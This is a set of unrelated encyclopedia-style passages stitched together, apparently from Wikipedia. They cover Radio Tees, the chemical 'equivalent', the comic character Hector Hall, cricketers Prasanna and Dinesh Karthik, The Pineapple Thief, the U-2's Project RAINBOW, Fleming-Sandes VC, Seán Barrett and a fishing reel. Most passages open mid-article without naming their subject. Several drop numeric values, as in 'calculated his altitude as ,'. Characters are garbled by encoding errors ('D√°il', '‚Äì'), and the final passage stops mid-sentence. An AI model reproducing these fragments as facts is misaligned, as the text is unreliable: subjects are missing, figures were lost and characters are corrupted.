Many of its presenters, such as Alastair Pirrie, Mark Page, John Simons, Mark Matthews and Graham Robb, derive from the local area. Alongside specialist soul, blues and country music shows, Radio Tees programmes included the hi-fi show Sounds Superb, the motoring show Sidelight and the holiday show Trains and Boats and Planes in which Radio Tees presenters would travel to destinations around the world and record reports interviewing local people and giving tourist advice and information. Radio Tees also met and interviewed artists over the years both in mainstream and specialist music genres including soul music legend Bobby Womack interviewed in 1985 by the then Nightlife show presenter, Mike Prior. =Late On= A notable programme from the Radio Tees era was Late On, presented by Graham Robb, which ran from 10pm to 1am every weekday evening in 1984. The show featured characters such as Rita the cleaner, Mad Tom the handyman, Ginger Johnson (ex-RAF) and Superstar Cecil, the proprietor of 'The Balloon and Feather' pub. Around the time of Late On, the station briefly experimented with over-the-air software downloads for popular home computers of the time, usually broadcasting them after Robb's show finished at 1am. =Event programming= Radio Tees reported at local events, broadcasting from the Cleveland and Darlington Shows, the Teesside Air Show and the Teesside Steel Family Gala. The station often organized its own outside broadcast events as well, many of which took place in John Walker Square, off Stockton- on-Tees High Street. For a few months during 1985, Radio Tees had its own light aircraft for traffic, named Flying Eye, kept at Teesside Airport, from which Graham Robb reported on traffic conditions and which featured daily on John Simons' breakfast show. Notable presenters Some former TFM Radio/Radio Tees presenters have gone on to work in the UK national media. These include Mark Page, who briefly worked as a presenter for BBC Radio 1 in the 1980s; Tony Gillham, who later went to BBC Radio 2 and now runs his own station, Black Radio; Roger Lewis, who was Head of Music at BBC Radio 1 and is now Managing Director of ITV Wales; and Alex Lester, who presented the 3am6am show on BBC Radio 2 from 1990 to 2016. Brian Anderson moved to Scotland to oversee programmes at the launch of Moray Firth Radio, and now presents a weekend programme on Aberdeen's Original 106.

John Simons was instrumental in launching the Century brand of stations and is now award-winning Group Programme Director for GMG Radio. It is in the areas of news and sport, though, that Radio Tees has given many well-known figures in the UK broadcasting industry. The inaugural news editor Bill Hamilton became a senior correspondent for BBC TV. Kent Barker became a reporter with BBC Radio and Home Affairs Correspondent for Channel Four News. Libby Fawbert joined The World at One and was an occasional presenter of the PM programme on BBC Radio 4. David Stevenson went to Piccadilly Radio before joining BBC Radio 4's Today and The World Tonight programmes. John Andrew had a career with BBC Radio News. Kate Fawcett worked for BBC Radio Scotland.

It is an archaic unit of measurement that was used in chemistry and the biological sciences (see Equivalent weight#In history). The mass of an equivalent is called its equivalent weight. In a more formal definition, the equivalent is the amount of a substance needed to do one of the following: * react with or supply one mole of hydrogen ions (H+) in an acid‚Äìbase reaction * react with or supply one mole of electrons in a redox reaction. By this definition, an equivalent is the number of moles of an ion in a solution, multiplied by the valence of that ion. If 1 mol of NaCl and 1 mol of CaCl2 dissolve in a solution, there is 1 equiv Na, 2 equiv Ca, and 3 equiv Cl in that solution. (The valency of calcium is 2, so for that ion 1 mole is 2 equivalents.) An earlier definition, used especially for chemical elements, holds that an equivalent is the amount of a substance that will react with of hydrogen, of oxygen, or of chlorine‚Äîor that will displace any of the three. In medicine and biochemistry In biological systems, reactions often happen on small scales, involving small amounts of substances, so those substances are routinely described in terms of milliequivalents (symbol: officially mequiv; unofficially but often mEq or meq), the prefix milli- denoting a factor of one thousandth (10‚àí3). Very often, the measure is used in terms of milliequivalents of solute per litre of solution (or milliNormal, where ). This is especially common for measurement of compounds in biological fluids; for instance, the healthy level of potassium in the blood of a human is defined between 3.5 and 5.0 mEq/L. A certain amount of univalent ions provides the same amount of equivalents while the same amount of divalent ions provides twice the amount of equivalents. For example, 1 mmol (0.001 mol) of Na+ is equal to 1 meq, while 1 mmol of Ca++ is equal to 2 meq.

He has gone by the names Silver Scarab, Sandman and, before his death, Doctor Fate. Publication history Hector Hall first appeared in All-Star Squadron #25 and was created by writer Roy Thomas and artist Jerry Ordway. Fictional character biography =Childhood= Hector Hall is the son of Carter and Shiera Hall, the Golden Age heroes known as Hawkman and Hawkgirl. Carter and Shiera were reincarnations of an ancient Egyptian pharaoh and his wife, both of whom had been killed and cursed by their rival Hath-Set. Unbeknownst to either of them, however, Hath-Set's curse also concerned any children that might be conceived by the pair. The curse of Seketh, the Ancient Egyptian God of Death, prophesied the combination of the Silver Scarab and the Eye of Ra, which would practically mean the end of the world. As such, when Hector was born during an archaeological dig near Cairo, he was born without a soul, destined to be a vessel for the Silver Scarab, an agent of vengeance called forth by Hath-Set. To further anger Hector, his parents would frequently visit the city of Feithera and spend time with their godson Norda Cantrell (who would become Northwind). Although the two children would be playmates as well, Hector carried a grudge against Norda for his wings and the attention he got from Hector's parents. It turned out later that, as Hector had been prophesied to become an agent of Hath-Set, Norda's destiny would be to stop him. Young Hector Hall would sometimes also play with the other children of the Justice Society, such as Al Rothstein (godchild of the first Atom), Lyta Trevor (child of the first Fury, who would grow up to marry Hector) and Rick Tyler (the son of the first Hourman). During one of these meetings, the kids ended up flying a jet, and almost crashed into the White House, where they were of course stopped and reprimanded by their parents. =The Silver Scarab= Hector Hall, the Silver Scarab Feeling neglected by his crime-fighting parents, in college Hector constructed a suit out of the Nth Metal that granted his parents the power of flight, while also adding some solar improvements. Hector had enrolled at UCLA and met his childhood friend, Lyta Trevor. The two quickly fell in love and began to date. Lyta wished to follow in her mother's footsteps and become the next Fury, and Hector shared the secret of his Silver Scarab suit with her. As such, the two decided to apply for membership in the Justice Society of America, the group their parents had helped form. Inviting Al Rothstein to apply with them as well as Norda Cantrell, who would codename himself Northwind, all four were turned down due to their age and inexperience. Before the four could further plead their case, Jenny Hayden and Todd Rice, both Alan Scott's children, showed up and also applied. The six of them left, but shortly after, Henry King Jr. came to apply, using the illusion of his father, Brainwave. He quickly told them that he was the son of the original Brainwave and didn't want a fight, but the JSA attacked him regardless. Feeling pity on the youngsters, Star-Spangled Kid decided to leave the JSA with Brainwave, Jr. in order to create a new group. They were joined by Power Girl and the Huntress, and called themselves Infinity, Inc. After battling their parents and mentors (who were under the influence of Koehaha, the River of Evil) the team publicly divulged their secret identities (revealing those of their parents in the process), and Hector also announced his engagement to Lyta. The Ultra-Humanite had already revealed Hawkman and Hawkgirl's secret identities, and Hector chose to confirm the rumor. They had little time to enjoy their happiness as the entity that had been within Hector since his birth came forth, thanks to the manipulation of Hath-Set. The reincarnated Silver Scarab fought Infinity, Inc. alongside Hath-Set and summoned the Eye of Ra. The heroes managed (largely thanks to the help of the returned Northwind) to win, but at the cost of Hector's life. As he died, he learned that Lyta was carrying his child, the one thing that was his undoing, for the child carried with him the purity and goodness of Hector Hall, resulting in the Silver Scarab being unable to fully control the Eye. =The Sandman= Cover to Infinity, Inc. #49 with Hector Hall as the new Sandman. Art by Vince Argondezzi. Hector Hall cheated death like his parents before. His consciousness had been cast into the Dreaming, where it was discovered by Brute and Glob, former servants of Morpheus, Dream of the Endless. Left at a loose end following the imprisonment of Morpheus in the early 20th century, Brute and Glob had taken to recruiting mortals as surrogate \\"dream kings,\\" which they hoped to use as a means to seize control of the entire Dreaming. Hector was one such pawn, and he adopted the costumed identity of the Sandman. In his new persona, Hector could only leave his \\"dream dimension\\" for one hour a day. He increasingly made use of this time to visit Lyta in her dreams, where he discovered that she had become pregnant with his child. This pattern continued for a long time before Hector was finally \\"caught\\" by his friend Al Rothstein, who had come to visit Lyta and propose to her. He told Lyta of his new role and asked her to marry him. She agreed, and the two of them departed for the dream dimension. The \\"Dream Dimension\\" was nothing more than a part of the Dreaming inside the mind of a young boy named Jed Walker which Brute and Glob had severed. Inside, Lyta slowly started to drift off, becoming less and less in touch with reality, and her pregnancy had completely halted for nearly two years. Hector became more and more obsessed with his role as the Sandman, and devolved from a serious superhero to one who fought nonsensical battles against weak villains. It was only a short time later that Morpheus escaped his captivity and set about putting the Dreaming back into order. Eventually, his attention fell on Brute and Glob. Ending their schemes, Morpheus returned Hector to the realm of the dead, and laid claim to his yet-to-be-born son, Daniel, who was destined to become the next Lord of Dreams. =Doctor Fate= Like his parents, Hector was in a reincarnation cycle. When he returned again several years later, he was chosen to adopt the vestments of Doctor Fate, a powerful sorcerer who had previously been a member of the Justice Society of America. As soon as he had adopted the vestments of Fate, he was forced to fight Mordru and was able to best him, capturing him inside the Amulet, thanks to the advice of Kent Nelson, who resided in the Amulet with his wife Inza. The parents of Hector's current body are Hank Hall (no relation) and Dawn Granger, better known as the superheroes Hawk and Dove. Since they were empowered by the Lords of Chaos and Order respectively, the new Doctor Fate was, like Jared Stevens before him, an agent of balance. While acting as Dr. Fate with the Justice Society, there was still a piece missing in Hector Hall's life, his wife. He and the team had traveled inside the Amulet of Anubis to find her, where Mordru revealed she was alive, and he returned to the place where he was reborn. There he found his second mother to be comatose, but concluded that Mordru had put up a spell of deception and that this woman was in fact Lyta. Hector sought his aid in reviving his wife from her coma with the JSA, and while he left her with them, he traveled to Thanagar. He came to rescue Hawkgirl and also witnessed the resurrection of his father. Hector was unsuccessful in his attempts to wake Lyta. He learned from what he believed to be Nabu, to travel to Gemworld, where he would uncover the secret behind Mordru's spell. It turned out that the Amulet had been created on Gemworld, and that Nabu had come from a world known as Cilia, with the Amulet being all that is left of the planet. Similarly, he learned that Mordru was in fact not a corporeal being, but a form of body-hopping magical energy. Hector left Gemworld with this new knowledge, and took with him the skull of Lord Wrynn, a man who had been consumed by Mordru. Hector started to prepare for the ritual involving the skull, although Nabu disapproved, wanting Hector to study more. At one point, the JSA confronted the Injustice Society, and after the elder heroes had been teleported away, the Spectre revealed himself and told them that they would have to fight a demon called Legacy. When Hector met with Nabu, he was confronted with his 'destiny': he was fated to kill Hawkgirl, after which he would be killed by his own father. Hector did not accept this destiny and instead swore that he would form his own path and fate. Hector and the rest of the JSA confronted Legacy who was revealed to be an old villain called Wizard, and they proceeded to beat him. Afterwards, Hector returned to his goal of freeing Lyta. When he had undone Mordru's spell, he found that Mordru had placed another spell, and that the woman was in fact Dawn Granger. Rejoining the JSA, he became aggressive to both protestors and his own teammates. Hawkman ordered him to remove his helmet and to their shock, Mordru had managed to replace Hector under the helm of Fate. Hector was now imprisoned in the cell he had created for Mordru in the Amulet. The Agents of Order that had come before helped him and it was revealed that Mordru had been disguised as Nabu the entire time and that he had taken over the body of Arion, a Lord of Order. He was brought to the house of the Nelsons, where he was told his wife was dead, which he still refused to accept. Hector gathered his strength and managed to return to reality to confront Mordru. After showing Mordru his future, a future of humiliation and failure, Hector imprisoned Mordru within the Rock of Eternity at the end of the universe. Hall had operated as Doctor Fate from Salem since then, with Nabu - again inhabiting the helm, but no longer controlling Fate - advising him. The Nelsons' souls still resided within the amulet, and they were occasionally able to contact the outside world (including Kent once having encountered the 1990s Starman). Hall's identity is known to a few who have figured it out, and in his secret identity, he socialized with some of the inhabitants of Salem, being on the whole more gregarious than his predecessors. When faced with the monstrous magical might of the being known as the Curse (a being that Nabu himself had not been able to completely vanquish), Hector was killed. As his body lay dying in the streets of Salem, Hector's spirit met with Nabu inside the helmet. Nabu had been verbally abusing Hector ever since the latter had taken on the mantle (because even though Hector was stated to have the most power as Dr. Fate, he was not living up to his potential). Finally, after Nabu continued his assault, telling Hector he might as well die so another could claim the mantle, Hector finally had enough, decked Nabu and returned to his body. He was able to revive his body and ended up capable enough to beat the Curse. Now Hector was truly secure and confident in his role. On a later adventure to Kahndaq with the JSA, Hector and Nabu clashed again, as Nabu took control of Doctor Fate, and worked against the JSA, stating that Hector was blindly following his father while Nabu argued that Black Adam's current agenda was justified. Hector, with the help of the Nelsons and the other previous incarnations of Fate, was able to trap Nabu in the Amulet and once again took control. At that same time, Hector's wife Lyta was revealed to have been imprisoned by Nabu to manipulate Hector. The couple were reunited as they appeared in Kahndaq again, just as Black Adam was defeated by the Justice Society. Hector and Lyta's spirits depart into the Dreaming in JSA #80. Art by Don Kramer. Lyta and Hall returned to the Tower and lived happily, until they were trapped in a section of Hell by the Spectre, who was on a rampage to destroy all magic. The two were stranded on a frozen mountain, where Hector was forced to fend off various demons that threatened him and Lyta. Meanwhile, an unconscious Lyta was communicating with their son Daniel, Lord of the Dreaming. Daniel proposed they join him in the Dreaming and when Lyta woke up, Hector had collapsed near her, close to death. She decided to take him up on his offer. Together with Hector, they entered the portal to the Dreaming. As their physical bodies froze to death atop the mountain, their spirits joined their son.  Powers and abilities  As the Silver Scarab, Hector wore a suit made of Nth metal. This metal was developed by his father, Carter Hall, and improved upon by Hector. The suit enabled him to fly in space, and project solar-powered ray blasts. Without his suit he has super strength and invulnerability. * As Sandman, Hector had extraordinary strength, the power of flight, and lived in a place called \\"The Dream Stream\\", which enabled him to see other people's dreams and he could project himself into the real world for one hour every twenty-four hours, and could travel through \\"The Dream Stream\\" almost immediately from anywhere in the real world to any other place during that one hour. * As Dr. Fate, Hector possessed a wide variety of powers. In general, he could fly, was resistant to damage, and had greater-than-human strength. Hall was able to \\"speak\\" with Nabu, the previous Doctors Fate, Kid Eternity, and Lyta through the helmet of Nabu, which gave him access to a wide variety of spells. He was susceptible to toxins in the air, however. At his most potent, Fate is an accomplished sorcerer, able to match most other wizards in the DC Universe, but not as powerful as true extra-human beings such as the Spectre. Fate has been observed throwing bolts of mystical energy, crafting solid objects out of energy, and transforming objects into other kinds of matter. The full limits of his magical skills are unknown.

He was a spin bowler, specializing in off spin and a member of the Indian spin quartet. He is an alumnus of National Institute of Engineering, Mysore. Career Prasanna played his debut Test cricket match at Madras against England in 1961. His first overseas tour to the West Indies was a tough one and he did not play another Test for five years. He left the sport for a period to finish his engineering degree, returning in 1967. He gained a regular place in the side following his excellent performances in England in 1967. He retired in 1978, after a tour of Pakistan which also signalled the decline of Bishen Singh Bedi and Bhagwat Chandrasekhar. He twice led Karnataka to the Ranji Trophy, the first time ending Bombay's 15-year reign. Prasanna was highly successful not only on Indian turning wickets, but on foreign pitches too. He achieved the record of fastest 100 wickets in Tests for an Indian Bowler (in 20 Tests) at his time. His record was broken by Ravichandran Ashwin . Widely respected and feared in domestic cricket as well, he enjoyed bowling to batsmen that were willing to try to hit him. He had a neat, brisk, high action and marvellous control of line, length, and flight. He spun the ball in a classic high loop towards the batsman, increasing his chances of beating his adversary in the air. As a result, he made the ball bounce higher than expected. A bowler with an attacking mindset, he was also patient, and would bait a batsman for over after over, attempting to induce a mistake. He has written an autobiography, One More Over.

History =Early years= Founder Bruce Soord started The Pineapple Thief as an outlet for his music back in 1999. Soord released the debut Abducting the Unicorn on Cyclops Records, which created enough interest to establish a small but loyal fan base. Soord returned to the Dining Room studios to work on the second album 137. During this time, several major labels started to take an interest, causing a delay in the release which arrived over two years after the debut. However, it was debatably the third album, Variations on a Dream that gave the band the boost it needed, reaching out to yet more people all over the world, by which point they were consistently the top sellers on their label, Cyclops. After this release in the spring of 2002 Bruce decided to form a band to take his music to the fans. The band consisted of his close musical friends ‚Äì former university bandmate Jon Sykes on bass, Wayne Higgins on guitars, Matt O'Leary on keyboards and Keith Harrison on drums. As a full band, they released 12 Stories Down in 2004, but Bruce Soord was unhappy with the final sound and re-recorded, remixed and changed some of the tracks before the release of 10 Stories Down in 2005. Matt O'Leary subsequently left the band, but Steve Kitch (who co-produced and mixed 10 Stories Down) joined to play keyboards. Following the release of Little Man in 2006, the band released What We Have Sown in late 2007 as a final Cyclops release before being signed to Kscope, a division of Snapper Music. In 2007 The Pineapple Thief's music featured on the final Episode of the MTV show The Hills (season 3). The song 'Snowdrops' can be heard on episode 28 during a scene between Lauren & Jo. Wayne Higgins left the band in March 2008, but the group continued as a four- piece live act, playing gigs across Europe, Canada and the US throughout much of the following years. =The Kscope years= The Pineapple Thief playing at Lunario in Mexico City (2019) In May 2008, The Pineapple Thief launched the Kscope label with the critically acclaimed album Tightly Unwound, which was marked by launch shows at Witchwood in Manchester on 17 May 2008 and at the Water Rats Theatre in London on 22 May 2008. The same day as the album's release, a mini-documentary filmed at The Half Moon, London, was released through the band's website, featuring interviews and two exclusive live tracks. This was followed in 2009 by The Dawn Raids EPs and 3000 Days, a 2-CD re-mixed and re-mastered collection of songs from their ten-year history to date. In January 2010, their 2006 album, Little Man was also fully remixed by Bruce Soord and Steve Kitch and released through Kscope with new artwork. There are plans to gradually give all of their back catalogue the same treatment as the Cyclops albums are no longer available and sell for large sums in the second-hand market. 2009 also saw them supporting Riverside on the UK leg of their European tour. Someone Here Is Missing was launched at a show at Bush Hall, London on 19 May 2010, whose attendees included Kscope labelmates Steven Wilson of Porcupine Tree and Daniel Cavanagh of Anathema. The album also features artwork by the legendary designer Storm Thorgerson. The album continues to nurture the band's trademark ‚Äòbittersweet‚Äô progressive sound. 2010 saw a number of European festival appearances and a full 2-week tour of mainland Europe. This was recorded and released as the download-only album Someone Here Is Live. The band entered the studio in January 2012 to record their ninth album, which included (for the first time) a 22-piece orchestra and choir. All the Wars was released in September 2012 and followed by a UK tour. On 8 February 2014 the band announced that Dan Osborne had replaced Keith Harrison on drums. The Pineapple Thief's tenth studio album, Magnolia, was released on 15 September 2014. It peaked at number 55 on UK Album Chart. In August 2016 the band released the album Your Wilderness, featuring Gavin Harrison on drums, through Kscope. On the last day of August 2018, the band released their 12th studio album, Dissolution. Gavin Harrison returns on drums, this time taking a more active role in the songwriting. The band will embark on a European tour in September, with Gavin Harrison on drums and George Marios on guitars, and LiZzard as the support act. On 4 September 2020 their 13th studio album Versions of the Truth was released.

However, the Soviets continued to track the U-2 flights in spite of experimentation with various technological fixes. Early flights The U-2 was developed by Lockheed Aircraft Corporation for the CIA to perform aerial reconnaissance overflights of the Soviet Union. Project director Richard M. Bissell assured President Dwight Eisenhower that the aircraft's high altitude (70,000 feet) would render it invisible to Soviet radars. However, the earliest flights in July 1956 were, in fact, tracked. On 5 July, an A-100 \\"Kama\\" radar detected Carmine Vito as he flew over Smolensk, en route to Moscow. The operators even calculated his altitude as , which was later rejected by experts who did not believe that an aircraft could fly that high. S-25 Berkut missiles (NATO designation SA-1 Guild) were not kept at the air defense sites around Moscow, and no intercept was attempted.Pocock, p. 39. In mid-August, Bissell assembled a group of advisers to begin work on solving the tracking problem. Among the group were Edwin H. Land, founder of the Polaroid Corporation and head of Project Three the Technological Capabilities Panel;Pocock, p. 33. Edward Purcell, a Nobel laureate physicist from Harvard; and Clarence L. \\"Kelly\\" Johnson, head of Lockheed Advanced Development Projects (ADP)‚Äîthe Skunk Works. The group conducted initial discussions. Then Land went to the MIT Lincoln Laboratory to recruit radar specialists for the work. The leader of the Lincoln Lab team was Franklin Rodgers, associate head of the radar division. Working in isolation from the rest of the lab, his group began trying to find ways to reduce the U-2's radar cross section.Suhler, pp. 14 - 16 As their work progressed, they traveled to California to work with Lockheed and to various military bases to perform radar measurements of U-2s in flight. Lockheed developed their own expertise in RCS techniques. A small group headed by L. D. MacDonald included chemist Mel George, physicist Edward Lovick, and other scientists and engineers.Pocock, p. 50. Anti-radar techniques The radar cross-section (RCS) of an object is a measure of how much electromagnetic (EM) energy is reflected by an object, expressed as an area, typically square meters. The RCS of an object is a function of the object's size, shape, and materials. It also varies depending upon the frequency of the EM energy. Because long distance search/acquisition radars use different frequencies than short range fire control radars, a variety of techniques would have to be used to protect the U-2. All parts of the aircraft created reflections‚Äîthe fuselage, tail, wings, engine inlets and exhaust. The anti-radar techniques investigated fell into two categories, either absorbing the radar energy or creating reflections that interfered with the reflections from the aircraft. =Wallpaper= Purcell's first concept was an absorption material to be placed on the U-2's fuselage. Developed by the Lincoln Lab team and Lockheed, it became known as \\"Wallpaper.\\" It consisted of a conductive pattern printed on a flexible sheet called grid that was then glued to honeycomb that was then applied to the aircraft. It was intended to be effective against the higher frequency radars.Suhler, pp. 22 - 25 =Trapeze= To reduce really low-frequency (70 MHz) reflections from the leading and trailing edges of the wings, a wire was placed parallel to and ahead of each wing's leading edge and another parallel to and behind each wing's trailing edge. To anchor the outboard end of each wire, a fiberglass pole was attached to each wingtip to give anchor points ahead and behind the wings. Each wire then ran from the front end of each pole to the slipper tank (which projected in front of the wing) and from the slipper tank to the fuselage. Behind each wing, a wire ran from the back end of the fiberglass pole to the fuselage. The horizontal stabilizer was treated in a similar manner. To protect the engine inlets, another wire ran diagonally from the nose to the slipper tank on each wing.Suhler, pp. 25 - 28 This scheme was called \\"Trapeze.\\" =Wires= To reduce low-frequency reflections from the fuselage and vertical stabilizer, wires were strung horizontally from the nose of the aircraft to the tail, and horizontally from the leading edge to the trailing edge of the vertical stabilizer. Ferrite beads were placed on the wires to tune them to the expected frequencies. This technique was simply called \\"Wires.\\"Suhler, pp. 28 - 30 =Cost of stealth= The disadvantage of Wallpaper was that it was a thermal insulator and trapped heat in the fuselage. Initially it was applied to the upper and lower surfaces, but after the heating problem was recognized, it was applied only to the lower half of the fuselage. Nevertheless, the overheating was to prove fatal. On 2 April 1957 pilot Robert Sieker was conducting a test flight with Wallpaper applied to the U-2 prototype, Article 341. The heat buildup caused the engine to stall. Without power to maintain cockpit pressurization, the faceplate on Sieker's helmet popped open and he lost consciousness. Uncontrolled, the U-2 went into a flat spin. Sieker recovered and bailed out, but at too low an altitude and he was killed.Pocock, pp. 50 - 51 The effect of the Wires and Trapeze installations was increased drag. This cost the U-2 5,000 feet in altitude and 20% in range. The pilots were not enthusiastic about the reduced performance, nor in flying an aircraft that one of them likened to being \\"wired like a guitar.\\"Pocock, pp. 50‚Äì52 Operational flights On 6 May 1957, Bissell reported to the President about the progress being made, saying that in operational missions, \\"the majority of incidents would go undetected.\\"Pedlow & Welzenbach, p. 129. In July the first \\"dirty bird\\" arrived at an operational detachment. The first mission of a \\"Covered Wagon,\\" as they were also known, took place on 21 July 1957. In all, there were nine flights of the treated aircraft. By May 1958, it had become apparent that the system was not effective, and its use ended.Pedlow & Welzenbach, p. 133. Follow-on By the Fall of 1957, only months after the first deployment of a dirty bird, it had become obvious to Bissell and the scientific team that the treatments would only have a marginal effect on tracking, and that a new aircraft would be needed. By designing in anti-radar features from the beginning, it was hoped that the succeeding aircraft would escape detection. =Conclusions= Bissell and his Air Force assistant, Col. Jack Gibbs, had been in discussions with aircraft and materials manufacturers, as well as various laboratories in an effort to understand what materials and designs might succeed. On 4 December 1957, Bissell conducted a meeting at which the various techniques were summed up:Bissell * Engines and other metal structures inside the aircraft would have to be shielded by reflection. *Some structural members could not be shielded and would have to be made transparent, by using plastic and eliminating metal components inside. *For protection against S-band and especially X-band radars, the exterior of the aircraft would have to be shaped to reflect the energy away from the radar unit. *To reduce reflections, exposed edges would have to be \\"softened\\" to have a gradual change in the impedance of the structure. =Project GUSTO= A large number of people had become aware of Project RAINBOW. To reduce the spread of information about the follow-up, the work was moved into a new project. Called \\"GUSTO,\\" only those with a need to know were cleared into it.Suhler, pg. 60 The end result of GUSTO would be the Lockheed A-12 OXCART.

Early life Fleming-Sandes was born at Northstead Road, Tulse Hill Park, London on 24 June 1894 the son of Alfred Fleming- Sandes.\\"Mr. A. J. T. Flemingsandes, V.C.\\" Times [London, England] 26 May 1961: 17. The Times Digital Archive. Web. 10 May 2013. He was educated at Dulwich College Preparatory School and at King's School, Canterbury. The day after the start of the First World War5 August 1914 he enlisted as a private in the Artists Rifles and was on active duty in France from October 1914. On 9 May 1915 he was commissioned as a temporary second lieutenant in The East Surrey Regiment. Victoria Cross Fleming-Sandes was 21 years old, and a temporary second lieutenant in the 2nd Battalion, The East Surrey Regiment, British Army during the First World War when the following deed took place for which he was awarded the VC. On 29 September 1915 at the Hohenzollern Redoubt, France, Second Lieutenant Fleming-Sandes was sent to command a company which was in a very critical position. His men, very much shaken by continual bombing and machine-gun fire, were beginning to retire, but the second lieutenant collected a few bombs and jumping on the parapet in full view of the Germans, only away, threw them. Although severely wounded almost at once, he continued to advance and throw bombs until he was again wounded. This act put new heart into his men and saved the situation. His Victoria Cross is displayed at the Queen's Royal Surrey Regiment Museum, Clandon Park, Surrey. Later life Fleming-Sandes left the Army as a lieutenant at the end of the war and in 1919 he joined the educational department of the Sudan government. ln 1924 he moved to the political department and in 1931 he was awarded the Order of the Nile. In 1935 he was appointed a Judge of the Sudan High Court and he married Dorothea May Weeks the following year. From 1942 he was Judge Advocate-General of the Sudan Defence Force before he retired in 1944 and returned to England. Upon his return to England he became chairman of the Pensions Appeal Tribunal for England and Wales until 1948. He died on 24 May 1961 aged 66.

He served as a Teachta D√°la (TD) for the D√∫n Laoghaire constituency from 1981 to 2002 and 2007 to 2020. Early life He was educated at CBS D√∫n Laoghaire, C.B.C. Monkstown and Presentation Brothers College in Glasthule, County Dublin. Before Barrett entered politics he was a partner in a successful Dublin-based insurance brokerage firm (Barrett, Hegarty Moloney, established in 1980). A keen fan of horse-racing, in 1987, he also established Se√°n Barrett Bloodstock Insurances Ltd. Political career He first became involved in local politics, serving on Dublin County Council from 1974 until 1982. He was a member of Dublin County Council between 1991 and 1993 and then served as a member of the D√∫n Laoghaire‚ÄìRathdown County Council until 1995. At the 1977 general election, Barrett stood as a Fine Gael candidate in the Dublin County South, but failed to win a seat. He was first elected to D√°il √âireann when he stood in the D√∫n Laoghaire constituency at the 1981 general election, where he was returned at each subsequent election until his retirement at the 2002 general election. He came out of retirement to successfully contest the 2007 general election. In December 1982, Garret FitzGerald became Taoiseach for the second time and Barrett was appointed Government Chief Whip and Minister of State at the Departments of the Taoiseach and Defence. Between February 1986 and March 1987, he served as Leader of the House with responsibility for D√°il Reform and Minister of State at the Department of Education. John Bruton's Rainbow Coalition came to power in 1994 and Barrett was again appointed as Government Chief Whip and Minister of State at the Departments of the Taoiseach and Defence. In 1995, Hugh Coveney resigned from the cabinet in controversial circumstances. Barrett was then appointed Minister for Defence and Minister for the Marine. During his tenure Barrett dealt with the army deafness compensation issue that ultimately resulted in claims of approximately ¬£300 million (‚Ç¨381 million) altogether against the State. There were approximately 9,000 claims by soldiers whose deafness arose from a failure to wear appropriate ear protection during firing exercises. There were 8,500 men and women serving in the Irish Army in 2006. Barrett's short ministerial career was blighted by critical remarks from Garda and army officers directed towards the Minister. His term as Minister ended when the government lost power at the 1997 general election. In 1999, he announced that he would not contest the next election, saying \\"at this stage, I believe it is time to make way for the next generation who must be given the chance to make their own contribution.\\" Se√°n Barrett (right) with Bogdan Borusewicz in Warsaw (2014) When Barrett, Liam T. Cosgrave and Monica Barnes were each first elected in 1981, Fine Gael secured three of the five seats and 48% of the first preference vote in D√∫n Laoghaire. But this massive vote waned over the following years and when Barrett and Barnes retired at the 2002 general election, Fine Gael failed to win even one seat in D√∫n Laoghaire. =Return to politics= In February 2006, Barrett announced that he wanted to come back from retirement, and stand again as a Fine Gael candidate at the next general election. He insisted that he would stand only if selected by the local party members, and would not accept being imposed as a candidate by Fine Gael headquarters. At a selection meeting in Dalkey in May 2006, Barrett and barrister Eugene Regan were chosen as Fine Gael's two candidates in the D√∫n Laoghaire constituency. With return of Barrett, the party was confident of winning two of the five seats, but at the general election in May 2007, Barrett was the fourth candidate returned to the 30th D√°il and Regan was not elected. Barrett did not return immediately to Fine Gael's front bench, but became Chairperson of the Oireachtas Joint Committee on Climate Change and Energy Security. He was subsequently promoted back to the front bench as Spokesperson on Foreign Affairs following an attempted heave against Enda Kenny. He met Chinese President Xi Jinping in 2013. Mahon Tribunal In evidence to the Mahon Tribunal on 8 June 2006, Barrett stated that while a member of Dublin County Council in the early 1990s, he was approached by a stranger with a proposition that he would be paid a professional consultancy fee of approximately ¬£80,000 (‚Ç¨101,600) to assist in a land-swap involving either Killiney Golf Club or D√∫n Laoghaire Golf Club with land owned at Cherrywood, County Dublin by Monarch Properties, a property development company. Barrett told the Tribunal that he immediately rejected this proposition and acknowledged that had he accepted, this would have brought him into conflict with his role as a councillor. He also expressed disgust at rumours that circulated in the Irish media and elsewhere over the past decade, or so, to the effect that he accepted large payments which he categorically told the Tribunal was not the case. He did receive an unsolicited cheque for ¬£600 in 1991 which he told the Tribunal was lodged to a Fine Gael D√∫n Laoghaire constituency bank account. Documentation provided by the Tribunal showed that Barrett received a cheque for ¬£500 prior to the November 1992 election, that he had no recollection of a further cheque for ¬£1,000 was paid by Monarch Properties in respect of a constituency fund raising gala dinner, to Fine Gael in 1995. A report in The Irish Times in July 2006 said that a representative of Fine Gael had described the Tribunal \\"as an outrage and a disgrace\\" for allowing unfounded allegations to be made against Barrett. Fine Gael, through its solicitor, expressed regret to the Tribunal on 25 July for this remark, describing it as 'inappropriate'.

It had bakelite side plates and weighed twelve ounces. This model was a surf reel used mainly for surf fishing. The similar Model K added a lever actuated free spool and durable metal reinforced plates. It was offered with and without a star drag. An adjustable bearing allowed the spool be tightened to prevent backlash. In 1933 the Model F was renamed the Sea Hawk, the basic Model K the Bayside, and the Model K with star drag the Long Beach. The choice of coastal Atlantic and Pacific cities for the former K models reinforced their connection to saltwater fishing.

He became captain of the Kolkata Knight Riders ahead of the 2018 Indian Premier League season till 16 October 2020. He made his maiden Test century against Bangladesh and was India's leading scorer in their Test tour of England, helping India win their first series in England in 21 years. After a drop in form in September 2007, Dinesh Karthik was dropped from the Test team. He has made only sporadic international appearances since then, although he continues to score well domestically.  Personal life  Karthik was born in Madras, Tamil Nadu. He began playing cricket at the age of 10, after a two-year period of living in Kuwait (where his father worked). Karthik was educated in India, and at Carmel School and Fahaheel Al-Watanieh Indian Private School in Kuwait and finally from eighth standard on studied at Don Bosco Matriculation Higher Secondary School in Egmore in Chennai. He was coached in cricket by his father, who was a first-division cricketer from Chennai. Disappointed that his career was hindered when he was forced by his family to put his education first, Karthik's father did not want his son to suffer the same fate and trained him hard from an early age. Karthik honed his reflexes at a young age by having his father throw hard leather balls at him at high speed. He was initially a batsman and learned wicket-keeping on the Tamil Nadu youth teams, and Robin Singh considered him very fit. Karthik steadily ascended the youth ranks. He made his Tamil Nadu under-14 debut in early 1999, and was promoted to the under-19 side at the beginning of the 2000/2001 season. He made his first- class debut for the senior side the following season. Karthik was married to Nikita Vanjara in 2007. Dinesh Karthik and Nikita divorced in 2012. He participated in the dance-reality show Ek Khiladi Ek Hasina with Nigaar Khan in 2008. Karthik got engaged to Indian squash player 